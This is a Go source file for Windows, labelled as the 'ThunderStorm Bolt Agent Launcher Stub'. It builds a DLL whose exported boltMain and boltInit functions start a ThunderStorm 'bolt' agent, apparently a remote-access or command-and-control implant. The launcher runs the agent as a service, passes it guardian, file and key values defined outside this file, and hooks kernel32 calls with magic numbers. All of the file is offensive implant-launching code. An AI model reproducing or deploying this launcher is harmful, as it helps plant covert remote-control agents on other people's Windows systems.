// +build windows
// ThunderStorm Bolt Agent Launcher Stub

package main

import "C"
import (
	"runtime/debug"
	"time"

	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"golang.org/x/sys/windows"
)

var boltUnlock = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetProcessVersion")

func main() {}

//export boltMain
func boltMain() {
	bolt.LaunchService(time.Second*30, boltInit)
}

//export boltInit
func boltInit() {
	debug.SetMaxStack(256000000)
	bolt.LaunchEx(
		boltGuardian, boltFiles, boltKey, func() { boltUnlock.Call(13371) }, func() { boltUnlock.Call(13372) },
	)
}
